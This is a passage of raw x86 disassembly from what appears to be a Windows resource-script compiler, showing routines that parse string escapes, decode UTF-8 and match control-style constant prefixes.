  404f24:	e8 a3 ec ff ff       	call   0x403bcc
  404f29:	72 d6                	jb     0x404f01
  404f2b:	e8 6f ed ff ff       	call   0x403c9f
  404f30:	83 f8 3f             	cmp    $0x3f,%eax
  404f33:	76 17                	jbe    0x404f4c
  404f35:	ba 88 08 00 00       	mov    $0x888,%edx
  404f3a:	eb 40                	jmp    0x404f7c
  404f3c:	53                   	push   %ebx
  404f3d:	56                   	push   %esi
  404f3e:	b8 54 ca 40 00       	mov    $0x40ca54,%eax
  404f43:	e8 9a 32 00 00       	call   0x4081e2
  404f48:	5e                   	pop    %esi
  404f49:	5b                   	pop    %ebx
  404f4a:	72 15                	jb     0x404f61
  404f4c:	c7 05 a8 aa 40 00 00 	movl   $0x0,0x40aaa8
  404f53:	00 00 00 
  404f56:	f8                   	clc
  404f57:	c1 e0 0a             	shl    $0xa,%eax
  404f5a:	0b 05 50 aa 40 00    	or     0x40aa50,%eax
  404f60:	c3                   	ret
  404f61:	e8 a2 eb ff ff       	call   0x403b08
  404f66:	72 0b                	jb     0x404f73
  404f68:	e8 21 ec ff ff       	call   0x403b8e
  404f6d:	72 a5                	jb     0x404f14
  404f6f:	74 ba                	je     0x404f2b
  404f71:	eb 04                	jmp    0x404f77
  404f73:	09 d2                	or     %edx,%edx
  404f75:	75 05                	jne    0x404f7c
  404f77:	ba 53 28 00 00       	mov    $0x2853,%edx
  404f7c:	f9                   	stc
  404f7d:	c3                   	ret
  404f7e:	ba 52 08 00 00       	mov    $0x852,%edx
  404f83:	c3                   	ret
  404f84:	83 fb 02             	cmp    $0x2,%ebx
  404f87:	73 06                	jae    0x404f8f
  404f89:	b8 5c 00 00 00       	mov    $0x5c,%eax
  404f8e:	c3                   	ret
  404f8f:	51                   	push   %ecx
  404f90:	31 c0                	xor    %eax,%eax
  404f92:	8a 16                	mov    (%esi),%dl
  404f94:	80 fa 37             	cmp    $0x37,%dl
  404f97:	77 05                	ja     0x404f9e
  404f99:	80 fa 30             	cmp    $0x30,%dl
  404f9c:	73 5b                	jae    0x404ff9
  404f9e:	b6 08                	mov    $0x8,%dh
  404fa0:	80 fa 61             	cmp    $0x61,%dl
  404fa3:	74 4e                	je     0x404ff3
  404fa5:	fe c6                	inc    %dh
  404fa7:	80 fa 74             	cmp    $0x74,%dl
  404faa:	74 47                	je     0x404ff3
  404fac:	fe c6                	inc    %dh
  404fae:	80 fa 6e             	cmp    $0x6e,%dl
  404fb1:	74 40                	je     0x404ff3
  404fb3:	b6 0d                	mov    $0xd,%dh
  404fb5:	80 fa 72             	cmp    $0x72,%dl
  404fb8:	74 39                	je     0x404ff3
  404fba:	b6 5c                	mov    $0x5c,%dh
  404fbc:	38 f2                	cmp    %dh,%dl
  404fbe:	74 33                	je     0x404ff3
  404fc0:	80 fa 78             	cmp    $0x78,%dl
  404fc3:	75 30                	jne    0x404ff5
  404fc5:	46                   	inc    %esi
  404fc6:	4b                   	dec    %ebx
  404fc7:	74 66                	je     0x40502f
  404fc9:	53                   	push   %ebx
  404fca:	56                   	push   %esi
  404fcb:	89 d8                	mov    %ebx,%eax
  404fcd:	48                   	dec    %eax
  404fce:	ba 02 00 00 00       	mov    $0x2,%edx
  404fd3:	f6 05 c6 ab 40 00 10 	testb  $0x10,0x40abc6
  404fda:	74 02                	je     0x404fde
  404fdc:	42                   	inc    %edx
  404fdd:	42                   	inc    %edx
  404fde:	39 c2                	cmp    %eax,%edx
  404fe0:	76 02                	jbe    0x404fe4
  404fe2:	89 c2                	mov    %eax,%edx
  404fe4:	89 d3                	mov    %edx,%ebx
  404fe6:	e8 a5 db ff ff       	call   0x402b90
  404feb:	5a                   	pop    %edx
  404fec:	5b                   	pop    %ebx
  404fed:	29 f3                	sub    %esi,%ebx
  404fef:	01 d3                	add    %edx,%ebx
  404ff1:	eb 04                	jmp    0x404ff7
  404ff3:	46                   	inc    %esi
  404ff4:	4b                   	dec    %ebx
  404ff5:	88 f0                	mov    %dh,%al
  404ff7:	eb 36                	jmp    0x40502f
  404ff9:	b9 03 00 00 00       	mov    $0x3,%ecx
  404ffe:	31 c0                	xor    %eax,%eax
  405000:	31 d2                	xor    %edx,%edx
  405002:	eb 12                	jmp    0x405016
  405004:	49                   	dec    %ecx
  405005:	74 28                	je     0x40502f
  405007:	80 3e 37             	cmpb   $0x37,(%esi)
  40500a:	77 23                	ja     0x40502f
  40500c:	80 3e 30             	cmpb   $0x30,(%esi)
  40500f:	72 1e                	jb     0x40502f
  405011:	c1 e0 03             	shl    $0x3,%eax
  405014:	72 19                	jb     0x40502f
  405016:	8a 16                	mov    (%esi),%dl
  405018:	80 ea 30             	sub    $0x30,%dl
  40501b:	01 d0                	add    %edx,%eax
  40501d:	3d ff 00 00 00       	cmp    $0xff,%eax
  405022:	76 07                	jbe    0x40502b
  405024:	29 d0                	sub    %edx,%eax
  405026:	c1 e8 03             	shr    $0x3,%eax
  405029:	eb 04                	jmp    0x40502f
  40502b:	46                   	inc    %esi
  40502c:	4b                   	dec    %ebx
  40502d:	75 d5                	jne    0x405004
  40502f:	09 db                	or     %ebx,%ebx
  405031:	59                   	pop    %ecx
  405032:	c3                   	ret
  405033:	c1 e0 06             	shl    $0x6,%eax
  405036:	09 db                	or     %ebx,%ebx
  405038:	74 11                	je     0x40504b
  40503a:	8a 16                	mov    (%esi),%dl
  40503c:	46                   	inc    %esi
  40503d:	4b                   	dec    %ebx
  40503e:	80 fa c0             	cmp    $0xc0,%dl
  405041:	73 08                	jae    0x40504b
  405043:	79 06                	jns    0x40504b
  405045:	80 e2 3f             	and    $0x3f,%dl
  405048:	08 d0                	or     %dl,%al
  40504a:	c3                   	ret
  40504b:	f9                   	stc
  40504c:	c3                   	ret
  40504d:	31 c0                	xor    %eax,%eax
  40504f:	ac                   	lods   %ds:(%esi),%al
  405050:	4b                   	dec    %ebx
  405051:	3c 80                	cmp    $0x80,%al
  405053:	72 13                	jb     0x405068
  405055:	3c c0                	cmp    $0xc0,%al
  405057:	72 68                	jb     0x4050c1
  405059:	c0 e0 03             	shl    $0x3,%al
  40505c:	72 0b                	jb     0x405069
  40505e:	c1 e0 03             	shl    $0x3,%eax
  405061:	e8 d0 ff ff ff       	call   0x405036
  405066:	72 59                	jb     0x4050c1
  405068:	c3                   	ret
  405069:	d0 e0                	shl    $1,%al
  40506b:	72 0c                	jb     0x405079
  40506d:	c1 e0 02             	shl    $0x2,%eax
  405070:	e8 c1 ff ff ff       	call   0x405036
  405075:	72 4a                	jb     0x4050c1
  405077:	eb 3e                	jmp    0x4050b7
  405079:	d0 e0                	shl    $1,%al
  40507b:	72 0b                	jb     0x405088
  40507d:	d1 e0                	shl    $1,%eax
  40507f:	e8 b2 ff ff ff       	call   0x405036
  405084:	72 3b                	jb     0x4050c1
  405086:	eb 28                	jmp    0x4050b0
  405088:	d0 e0                	shl    $1,%al
  40508a:	72 09                	jb     0x405095
  40508c:	e8 a5 ff ff ff       	call   0x405036
  405091:	72 2e                	jb     0x4050c1
  405093:	eb 14                	jmp    0x4050a9
  405095:	d0 e0                	shl    $1,%al
  405097:	72 28                	jb     0x4050c1
  405099:	d1 e8                	shr    $1,%eax
  40509b:	e8 96 ff ff ff       	call   0x405036
  4050a0:	72 1f                	jb     0x4050c1
  4050a2:	e8 8c ff ff ff       	call   0x405033
  4050a7:	72 18                	jb     0x4050c1
  4050a9:	e8 85 ff ff ff       	call   0x405033
  4050ae:	72 11                	jb     0x4050c1
  4050b0:	e8 7e ff ff ff       	call   0x405033
  4050b5:	72 0a                	jb     0x4050c1
  4050b7:	e8 77 ff ff ff       	call   0x405033
  4050bc:	72 03                	jb     0x4050c1
  4050be:	c3                   	ret
  4050bf:	46                   	inc    %esi
  4050c0:	4b                   	dec    %ebx
  4050c1:	09 db                	or     %ebx,%ebx
  4050c3:	74 0a                	je     0x4050cf
  4050c5:	8a 06                	mov    (%esi),%al
  4050c7:	3c 80                	cmp    $0x80,%al
  4050c9:	72 04                	jb     0x4050cf
  4050cb:	3c c0                	cmp    $0xc0,%al
  4050cd:	72 f0                	jb     0x4050bf
  4050cf:	b8 fd ff 00 00       	mov    $0xfffd,%eax
  4050d4:	c3                   	ret
  4050d5:	57                   	push   %edi
  4050d6:	09 db                	or     %ebx,%ebx
  4050d8:	74 5b                	je     0x405135
  4050da:	30 e4                	xor    %ah,%ah
  4050dc:	ac                   	lods   %ds:(%esi),%al
  4050dd:	3c 22                	cmp    $0x22,%al
  4050df:	75 0e                	jne    0x4050ef
  4050e1:	83 fb 01             	cmp    $0x1,%ebx
  4050e4:	76 4b                	jbe    0x405131
  4050e6:	80 3e 22             	cmpb   $0x22,(%esi)
  4050e9:	75 46                	jne    0x405131
  4050eb:	46                   	inc    %esi
  4050ec:	4b                   	dec    %ebx
  4050ed:	eb 42                	jmp    0x405131
  4050ef:	3c 0d                	cmp    $0xd,%al
  4050f1:	75 18                	jne    0x40510b
  4050f3:	b0 20                	mov    $0x20,%al
  4050f5:	4b                   	dec    %ebx
  4050f6:	74 3d                	je     0x405135
  4050f8:	80 3e 0a             	cmpb   $0xa,(%esi)
  4050fb:	75 04                	jne    0x405101
  4050fd:	46                   	inc    %esi
  4050fe:	4b                   	dec    %ebx
  4050ff:	74 34                	je     0x405135
  405101:	38 06                	cmp    %al,(%esi)
  405103:	74 f8                	je     0x4050fd
  405105:	aa                   	stos   %al,%es:(%edi)
  405106:	b0 0a                	mov    $0xa,%al
  405108:	aa                   	stos   %al,%es:(%edi)
  405109:	eb d1                	jmp    0x4050dc
  40510b:	3c 5c                	cmp    $0x5c,%al
  40510d:	75 22                	jne    0x405131
  40510f:	f6 05 c4 ab 40 00 06 	testb  $0x6,0x40abc4
  405116:	75 09                	jne    0x405121
  405118:	f6 05 c6 ab 40 00 10 	testb  $0x10,0x40abc6
  40511f:	75 14                	jne    0x405135
  405121:	f6 05 c4 ab 40 00 01 	testb  $0x1,0x40abc4
  405128:	75 07                	jne    0x405131
  40512a:	e8 55 fe ff ff       	call   0x404f84
  40512f:	74 04                	je     0x405135
  405131:	aa                   	stos   %al,%es:(%edi)
  405132:	4b                   	dec    %ebx
  405133:	75 a7                	jne    0x4050dc
  405135:	89 f8                	mov    %edi,%eax
  405137:	5f                   	pop    %edi
  405138:	c3                   	ret
  405139:	2b 05 68 aa 40 00    	sub    0x40aa68,%eax
  40513f:	76 1a                	jbe    0x40515b
  405141:	89 c2                	mov    %eax,%edx
  405143:	d1 e2                	shl    $1,%edx
  405145:	52                   	push   %edx
  405146:	57                   	push   %edi
  405147:	50                   	push   %eax
  405148:	ff 35 68 aa 40 00    	push   0x40aa68
  40514e:	6a 01                	push   $0x1
  405150:	6a 00                	push   $0x0
  405152:	e8 51 cf 00 00       	call   0x4120a8
  405157:	d1 e0                	shl    $1,%eax
  405159:	01 c7                	add    %eax,%edi
  40515b:	c3                   	ret
  40515c:	53                   	push   %ebx
  40515d:	56                   	push   %esi
  40515e:	8b 35 68 aa 40 00    	mov    0x40aa68,%esi
  405164:	29 f0                	sub    %esi,%eax
  405166:	76 1d                	jbe    0x405185
  405168:	89 c3                	mov    %eax,%ebx
  40516a:	80 3e 5c             	cmpb   $0x5c,(%esi)
  40516d:	75 0b                	jne    0x40517a
  40516f:	46                   	inc    %esi
  405170:	e8 0f fe ff ff       	call   0x404f84
  405175:	74 0e                	je     0x405185
  405177:	4b                   	dec    %ebx
  405178:	eb 05                	jmp    0x40517f
  40517a:	e8 ce fe ff ff       	call   0x40504d
  40517f:	66 ab                	stos   %ax,%es:(%edi)
  405181:	09 db                	or     %ebx,%ebx
  405183:	75 e5                	jne    0x40516a
  405185:	5e                   	pop    %esi
  405186:	5b                   	pop    %ebx
  405187:	c3                   	ret
  405188:	f6 05 c6 ab 40 00 04 	testb  $0x4,0x40abc6
  40518f:	74 0f                	je     0x4051a0
  405191:	f6 05 c6 ab 40 00 10 	testb  $0x10,0x40abc6
  405198:	75 06                	jne    0x4051a0
  40519a:	e8 36 ff ff ff       	call   0x4050d5
  40519f:	c3                   	ret
  4051a0:	51                   	push   %ecx
  4051a1:	89 da                	mov    %ebx,%edx
  4051a3:	f6 05 c4 ab 40 00 06 	testb  $0x6,0x40abc4
  4051aa:	74 3e                	je     0x4051ea
  4051ac:	29 15 6c aa 40 00    	sub    %edx,0x40aa6c
  4051b2:	77 09                	ja     0x4051bd
  4051b4:	e8 ea ec ff ff       	call   0x403ea3
  4051b9:	75 02                	jne    0x4051bd
  4051bb:	31 db                	xor    %ebx,%ebx
  4051bd:	57                   	push   %edi
  4051be:	57                   	push   %edi
  4051bf:	8b 3d 68 aa 40 00    	mov    0x40aa68,%edi
  4051c5:	80 0d c4 ab 40 00 01 	orb    $0x1,0x40abc4
  4051cc:	e8 04 ff ff ff       	call   0x4050d5
  4051d1:	80 25 c4 ab 40 00 fe 	andb   $0xfe,0x40abc4
  4051d8:	5f                   	pop    %edi
  4051d9:	e8 7e ff ff ff       	call   0x40515c
  4051de:	89 f8                	mov    %edi,%eax
  4051e0:	5f                   	pop    %edi
  4051e1:	80 25 c6 ab 40 00 ef 	andb   $0xef,0x40abc6
  4051e8:	59                   	pop    %ecx
  4051e9:	c3                   	ret
  4051ea:	29 15 6c aa 40 00    	sub    %edx,0x40aa6c
  4051f0:	77 07                	ja     0x4051f9
  4051f2:	e8 ac ec ff ff       	call   0x403ea3
  4051f7:	74 2b                	je     0x405224
  4051f9:	57                   	push   %edi
  4051fa:	57                   	push   %edi
  4051fb:	8b 3d 68 aa 40 00    	mov    0x40aa68,%edi
  405201:	e8 cf fe ff ff       	call   0x4050d5
  405206:	5f                   	pop    %edi
  405207:	74 13                	je     0x40521c
  405209:	e8 2b ff ff ff       	call   0x405139
  40520e:	e8 71 fd ff ff       	call   0x404f84
  405213:	74 0c                	je     0x405221
  405215:	66 ab                	stos   %ax,%es:(%edi)
  405217:	4b                   	dec    %ebx
  405218:	74 07                	je     0x405221
  40521a:	eb de                	jmp    0x4051fa
  40521c:	e8 18 ff ff ff       	call   0x405139
  405221:	89 f8                	mov    %edi,%eax
  405223:	5f                   	pop    %edi
  405224:	80 25 c6 ab 40 00 ef 	andb   $0xef,0x40abc6
  40522b:	59                   	pop    %ecx
  40522c:	c3                   	ret
  40522d:	53                   	push   %ebx
  40522e:	51                   	push   %ecx
  40522f:	57                   	push   %edi
  405230:	8b 3d d4 aa 40 00    	mov    0x40aad4,%edi
  405236:	e8 4d ff ff ff       	call   0x405188
  40523b:	66 c7 00 00 00       	movw   $0x0,(%eax)
  405240:	83 c0 02             	add    $0x2,%eax
  405243:	5f                   	pop    %edi
  405244:	59                   	pop    %ecx
  405245:	5b                   	pop    %ebx
  405246:	c3                   	ret
  405247:	53                   	push   %ebx
  405248:	51                   	push   %ecx
  405249:	57                   	push   %edi
  40524a:	89 d7                	mov    %edx,%edi
  40524c:	e8 37 ff ff ff       	call   0x405188
  405251:	39 c7                	cmp    %eax,%edi
  405253:	74 07                	je     0x40525c
  405255:	66 83 78 fe 00       	cmpw   $0x0,-0x2(%eax)
  40525a:	74 08                	je     0x405264
  40525c:	66 c7 00 00 00       	movw   $0x0,(%eax)
  405261:	83 c0 02             	add    $0x2,%eax
  405264:	5f                   	pop    %edi
  405265:	59                   	pop    %ecx
  405266:	5b                   	pop    %ebx
  405267:	c3                   	ret
  405268:	66 8b 03             	mov    (%ebx),%ax
  40526b:	66 89 02             	mov    %ax,(%edx)
  40526e:	83 c2 02             	add    $0x2,%edx
  405271:	83 c3 02             	add    $0x2,%ebx
  405274:	66 83 f8 00          	cmp    $0x0,%ax
  405278:	75 ee                	jne    0x405268
  40527a:	f6 05 c8 ab 40 00 02 	testb  $0x2,0x40abc8
  405281:	74 03                	je     0x405286
  405283:	83 ea 02             	sub    $0x2,%edx
  405286:	c3                   	ret
  405287:	f6 05 c8 ab 40 00 04 	testb  $0x4,0x40abc8
  40528e:	74 08                	je     0x405298
  405290:	80 25 c8 ab 40 00 fb 	andb   $0xfb,0x40abc8
  405297:	c3                   	ret
  405298:	80 25 c6 ab 40 00 ef 	andb   $0xef,0x40abc6
  40529f:	a0 c5 ab 40 00       	mov    0x40abc5,%al
  4052a4:	24 02                	and    $0x2,%al
  4052a6:	89 fe                	mov    %edi,%esi
  4052a8:	80 3e 22             	cmpb   $0x22,(%esi)
  4052ab:	74 20                	je     0x4052cd
  4052ad:	83 f9 02             	cmp    $0x2,%ecx
  4052b0:	72 66                	jb     0x405318
  4052b2:	66 81 3e 4c 22       	cmpw   $0x224c,(%esi)
  4052b7:	74 07                	je     0x4052c0
  4052b9:	66 81 3e 6c 22       	cmpw   $0x226c,(%esi)
  4052be:	75 58                	jne    0x405318
  4052c0:	0c 01                	or     $0x1,%al
  4052c2:	80 0d c6 ab 40 00 10 	orb    $0x10,0x40abc6
  4052c9:	47                   	inc    %edi
  4052ca:	49                   	dec    %ecx
  4052cb:	74 4b                	je     0x405318
  4052cd:	47                   	inc    %edi
  4052ce:	49                   	dec    %ecx
  4052cf:	74 47                	je     0x405318
  4052d1:	80 3f 22             	cmpb   $0x22,(%edi)
  4052d4:	77 f7                	ja     0x4052cd
  4052d6:	74 11                	je     0x4052e9
  4052d8:	80 3f 0d             	cmpb   $0xd,(%edi)
  4052db:	75 f0                	jne    0x4052cd
  4052dd:	a8 02                	test   $0x2,%al
  4052df:	75 37                	jne    0x405318
  4052e1:	ff 05 0c ab 40 00    	incl   0x40ab0c
  4052e7:	eb e4                	jmp    0x4052cd
  4052e9:	47                   	inc    %edi
  4052ea:	49                   	dec    %ecx
  4052eb:	74 05                	je     0x4052f2
  4052ed:	80 3f 22             	cmpb   $0x22,(%edi)
  4052f0:	74 db                	je     0x4052cd
  4052f2:	89 fb                	mov    %edi,%ebx
  4052f4:	29 f3                	sub    %esi,%ebx
  4052f6:	89 35 14 ab 40 00    	mov    %esi,0x40ab14
  4052fc:	89 1d 18 ab 40 00    	mov    %ebx,0x40ab18
  405302:	46                   	inc    %esi
  405303:	4b                   	dec    %ebx
  405304:	4b                   	dec    %ebx
  405305:	80 25 c5 ab 40 00 fd 	andb   $0xfd,0x40abc5
  40530c:	a8 01                	test   $0x1,%al
  40530e:	74 07                	je     0x405317
  405310:	4b                   	dec    %ebx
  405311:	46                   	inc    %esi
  405312:	ba 57 08 00 00       	mov    $0x857,%edx
  405317:	c3                   	ret
  405318:	80 25 c5 ab 40 00 fd 	andb   $0xfd,0x40abc5
  40531f:	ba 75 08 00 04       	mov    $0x4000875,%edx
  405324:	f9                   	stc
  405325:	c3                   	ret
  405326:	e8 de f0 ff ff       	call   0x404409
  40532b:	72 47                	jb     0x405374
  40532d:	74 29                	je     0x405358
  40532f:	80 25 c5 ab 40 00 fd 	andb   $0xfd,0x40abc5
  405336:	e8 c8 ef ff ff       	call   0x404303
  40533b:	72 37                	jb     0x405374
  40533d:	75 2f                	jne    0x40536e
  40533f:	e8 c4 e7 ff ff       	call   0x403b08
  405344:	72 24                	jb     0x40536a
  405346:	e8 43 e8 ff ff       	call   0x403b8e
  40534b:	72 d9                	jb     0x405326
  40534d:	74 1f                	je     0x40536e
  40534f:	e8 ec e9 ff ff       	call   0x403d40
  405354:	72 18                	jb     0x40536e
  405356:	eb 07                	jmp    0x40535f
  405358:	e8 2a ff ff ff       	call   0x405287
  40535d:	72 0f                	jb     0x40536e
  40535f:	c7 05 a8 aa 40 00 00 	movl   $0x0,0x40aaa8
  405366:	00 00 00 
  405369:	c3                   	ret
  40536a:	09 d2                	or     %edx,%edx
  40536c:	75 06                	jne    0x405374
  40536e:	8b 15 cc aa 40 00    	mov    0x40aacc,%edx
  405374:	80 25 c5 ab 40 00 fd 	andb   $0xfd,0x40abc5
  40537b:	f9                   	stc
  40537c:	c3                   	ret
  40537d:	89 15 d4 aa 40 00    	mov    %edx,0x40aad4
  405383:	e8 9e ff ff ff       	call   0x405326
  405388:	72 06                	jb     0x405390
  40538a:	e8 9e fe ff ff       	call   0x40522d
  40538f:	f8                   	clc
  405390:	c3                   	ret
  405391:	89 15 d4 aa 40 00    	mov    %edx,0x40aad4
  405397:	e8 30 e8 ff ff       	call   0x403bcc
  40539c:	8b 15 cc aa 40 00    	mov    0x40aacc,%edx
  4053a2:	72 2c                	jb     0x4053d0
  4053a4:	e8 f6 e8 ff ff       	call   0x403c9f
  4053a9:	72 25                	jb     0x4053d0
  4053ab:	8b 15 d4 aa 40 00    	mov    0x40aad4,%edx
  4053b1:	f6 05 c5 ab 40 00 40 	testb  $0x40,0x40abc5
  4053b8:	75 05                	jne    0x4053bf
  4053ba:	66 89 02             	mov    %ax,(%edx)
  4053bd:	eb 09                	jmp    0x4053c8
  4053bf:	66 c7 02 ff ff       	movw   $0xffff,(%edx)
  4053c4:	66 89 42 02          	mov    %ax,0x2(%edx)
  4053c8:	80 25 c5 ab 40 00 bf 	andb   $0xbf,0x40abc5
  4053cf:	c3                   	ret
  4053d0:	80 25 c5 ab 40 00 bf 	andb   $0xbf,0x40abc5
  4053d7:	f9                   	stc
  4053d8:	c3                   	ret
  4053d9:	89 15 d4 aa 40 00    	mov    %edx,0x40aad4
  4053df:	e8 25 f0 ff ff       	call   0x404409
  4053e4:	72 50                	jb     0x405436
  4053e6:	74 4e                	je     0x405436
  4053e8:	e8 16 ef ff ff       	call   0x404303
  4053ed:	72 41                	jb     0x405430
  4053ef:	74 16                	je     0x405407
  4053f1:	8b 15 d4 aa 40 00    	mov    0x40aad4,%edx
  4053f7:	80 0d c5 ab 40 00 40 	orb    $0x40,0x40abc5
  4053fe:	e8 8e ff ff ff       	call   0x405391
  405403:	72 2b                	jb     0x405430
  405405:	eb 27                	jmp    0x40542e
  405407:	e8 fc e6 ff ff       	call   0x403b08
  40540c:	72 17                	jb     0x405425
  40540e:	e8 7b e7 ff ff       	call   0x403b8e
  405413:	72 1b                	jb     0x405430
  405415:	75 19                	jne    0x405430
  405417:	80 0d c5 ab 40 00 40 	orb    $0x40,0x40abc5
  40541e:	e8 88 ff ff ff       	call   0x4053ab
  405423:	eb 09                	jmp    0x40542e
  405425:	09 d2                	or     %edx,%edx
  405427:	75 0d                	jne    0x405436
  405429:	e8 ff fd ff ff       	call   0x40522d
  40542e:	f8                   	clc
  40542f:	c3                   	ret
  405430:	8b 15 cc aa 40 00    	mov    0x40aacc,%edx
  405436:	f9                   	stc
  405437:	c3                   	ret
  405438:	89 15 d4 aa 40 00    	mov    %edx,0x40aad4
  40543e:	66 c7 02 00 00       	movw   $0x0,(%edx)
  405443:	e8 c1 ef ff ff       	call   0x404409
  405448:	72 3f                	jb     0x405489
  40544a:	e8 b4 ee ff ff       	call   0x404303
  40544f:	72 41                	jb     0x405492
  405451:	75 18                	jne    0x40546b
  405453:	e8 b0 e6 ff ff       	call   0x403b08
  405458:	73 06                	jae    0x405460
  40545a:	09 d2                	or     %edx,%edx
  40545c:	74 44                	je     0x4054a2
  40545e:	eb 29                	jmp    0x405489
  405460:	e8 29 e7 ff ff       	call   0x403b8e
  405465:	72 dc                	jb     0x405443
  405467:	74 09                	je     0x405472
  405469:	eb 18                	jmp    0x405483
  40546b:	e8 5c e7 ff ff       	call   0x403bcc
  405470:	72 11                	jb     0x405483
  405472:	e8 2d ff ff ff       	call   0x4053a4
  405477:	72 29                	jb     0x4054a2
  405479:	80 25 c5 ab 40 00 3e 	andb   $0x3e,0x40abc5
  405480:	09 c9                	or     %ecx,%ecx
  405482:	c3                   	ret
  405483:	8b 15 cc aa 40 00    	mov    0x40aacc,%edx
  405489:	80 25 c5 ab 40 00 3e 	andb   $0x3e,0x40abc5
  405490:	f9                   	stc
  405491:	c3                   	ret
  405492:	80 0d c8 ab 40 00 04 	orb    $0x4,0x40abc8
  405499:	f6 05 c5 ab 40 00 01 	testb  $0x1,0x40abc5
  4054a0:	75 d7                	jne    0x405479
  4054a2:	80 0d c8 ab 40 00 04 	orb    $0x4,0x40abc8
  4054a9:	80 25 c5 ab 40 00 3e 	andb   $0x3e,0x40abc5
  4054b0:	31 c0                	xor    %eax,%eax
  4054b2:	c3                   	ret
  4054b3:	f6 05 c5 ab 40 00 04 	testb  $0x4,0x40abc5
  4054ba:	75 08                	jne    0x4054c4
  4054bc:	e8 bc fe ff ff       	call   0x40537d
  4054c1:	73 14                	jae    0x4054d7
  4054c3:	c3                   	ret
  4054c4:	80 25 c5 ab 40 00 fb 	andb   $0xfb,0x40abc5
  4054cb:	89 d0                	mov    %edx,%eax
  4054cd:	66 c7 00 00 00       	movw   $0x0,(%eax)
  4054d2:	83 c0 02             	add    $0x2,%eax
  4054d5:	eb 02                	jmp    0x4054d9
  4054d7:	31 d2                	xor    %edx,%edx
  4054d9:	a3 78 aa 40 00       	mov    %eax,0x40aa78
  4054de:	c3                   	ret
  4054df:	51                   	push   %ecx
  4054e0:	57                   	push   %edi
  4054e1:	89 15 d4 aa 40 00    	mov    %edx,0x40aad4
  4054e7:	c7 05 cc aa 40 00 00 	movl   $0x0,0x40aacc
  4054ee:	00 00 00 
  4054f1:	e8 87 fe ff ff       	call   0x40537d
  4054f6:	73 40                	jae    0x405538
  4054f8:	5f                   	pop    %edi
  4054f9:	59                   	pop    %ecx
  4054fa:	09 d2                	or     %edx,%edx
  4054fc:	75 31                	jne    0x40552f
  4054fe:	c7 05 a8 aa 40 00 00 	movl   $0x0,0x40aaa8
  405505:	00 00 00 
  405508:	c7 05 cc aa 40 00 6e 	movl   $0x86e,0x40aacc
  40550f:	08 00 00 
  405512:	e8 3b f1 ff ff       	call   0x404652
  405517:	72 16                	jb     0x40552f
  405519:	8b 15 d4 aa 40 00    	mov    0x40aad4,%edx
  40551f:	66 c7 02 ff ff       	movw   $0xffff,(%edx)
  405524:	66 89 42 02          	mov    %ax,0x2(%edx)
  405528:	83 c2 04             	add    $0x4,%edx
  40552b:	89 d0                	mov    %edx,%eax
  40552d:	eb 0b                	jmp    0x40553a
  40552f:	80 25 c6 ab 40 00 df 	andb   $0xdf,0x40abc6
  405536:	f9                   	stc
  405537:	c3                   	ret
  405538:	5a                   	pop    %edx
  405539:	5a                   	pop    %edx
  40553a:	31 d2                	xor    %edx,%edx
  40553c:	80 25 c6 ab 40 00 df 	andb   $0xdf,0x40abc6
  405543:	c3                   	ret
  405544:	51                   	push   %ecx
  405545:	57                   	push   %edi
  405546:	80 0d c6 ab 40 00 20 	orb    $0x20,0x40abc6
  40554d:	c7 05 cc aa 40 00 00 	movl   $0x0,0x40aacc
  405554:	00 00 00 
  405557:	ba c0 f2 40 00       	mov    $0x40f2c0,%edx
  40555c:	e8 1c fe ff ff       	call   0x40537d
  405561:	73 47                	jae    0x4055aa
  405563:	5f                   	pop    %edi
  405564:	59                   	pop    %ecx
  405565:	09 d2                	or     %edx,%edx
  405567:	75 38                	jne    0x4055a1
  405569:	c7 05 a8 aa 40 00 00 	movl   $0x0,0x40aaa8
  405570:	00 00 00 
  405573:	c7 05 cc aa 40 00 7e 	movl   $0x87e,0x40aacc
  40557a:	08 00 00 
  40557d:	e8 d0 f0 ff ff       	call   0x404652
  405582:	72 1d                	jb     0x4055a1
  405584:	80 0d c8 ab 40 00 02 	orb    $0x2,0x40abc8
  40558b:	ba c0 f2 40 00       	mov    $0x40f2c0,%edx
  405590:	66 c7 02 ff ff       	movw   $0xffff,(%edx)
  405595:	66 89 42 02          	mov    %ax,0x2(%edx)
  405599:	66 c7 42 04 00 00    	movw   $0x0,0x4(%edx)
  40559f:	eb 0b                	jmp    0x4055ac
  4055a1:	80 25 c6 ab 40 00 df 	andb   $0xdf,0x40abc6
  4055a8:	f9                   	stc
  4055a9:	c3                   	ret
  4055aa:	5a                   	pop    %edx
  4055ab:	5a                   	pop    %edx
  4055ac:	80 25 c6 ab 40 00 df 	andb   $0xdf,0x40abc6
  4055b3:	f8                   	clc
  4055b4:	c3                   	ret
  4055b5:	3d 80 00 00 00       	cmp    $0x80,%eax
  4055ba:	72 11                	jb     0x4055cd
  4055bc:	2d 80 00 00 00       	sub    $0x80,%eax
  4055c1:	c1 e0 02             	shl    $0x2,%eax
  4055c4:	05 98 ac 40 00       	add    $0x40ac98,%eax
  4055c9:	8b 00                	mov    (%eax),%eax
  4055cb:	eb 0a                	jmp    0x4055d7
  4055cd:	31 d2                	xor    %edx,%edx
  4055cf:	48                   	dec    %eax
  4055d0:	78 03                	js     0x4055d5
  4055d2:	0f ab c2             	bts    %eax,%edx
  4055d5:	89 d0                	mov    %edx,%eax
  4055d7:	f8                   	clc
  4055d8:	c3                   	ret
  4055d9:	53                   	push   %ebx
  4055da:	56                   	push   %esi
  4055db:	f6 05 c5 ab 40 00 10 	testb  $0x10,0x40abc5
  4055e2:	74 6a                	je     0x40564e
  4055e4:	b8 a6 be 40 00       	mov    $0x40bea6,%eax
  4055e9:	81 3e 54 43 53 5f    	cmpl   $0x5f534354,(%esi)
  4055ef:	75 13                	jne    0x405604
  4055f1:	81 7e 03 5f 45 58 5f 	cmpl   $0x5f58455f,0x3(%esi)
  4055f8:	75 50                	jne    0x40564a
  4055fa:	83 c6 07             	add    $0x7,%esi
  4055fd:	83 eb 07             	sub    $0x7,%ebx
  405600:	77 29                	ja     0x40562b
  405602:	eb 46                	jmp    0x40564a
  405604:	b8 bc b8 40 00       	mov    $0x40b8bc,%eax
  405609:	81 3e 54 42 53 54    	cmpl   $0x54534254,(%esi)
  40560f:	75 1c                	jne    0x40562d
  405611:	81 7e 04 59 4c 45 5f 	cmpl   $0x5f454c59,0x4(%esi)
  405618:	75 30                	jne    0x40564a
  40561a:	81 7e 07 5f 45 58 5f 	cmpl   $0x5f58455f,0x7(%esi)
  405621:	75 27                	jne    0x40564a
  405623:	83 c6 0b             	add    $0xb,%esi
  405626:	83 eb 0b             	sub    $0xb,%ebx
  405629:	76 1f                	jbe    0x40564a
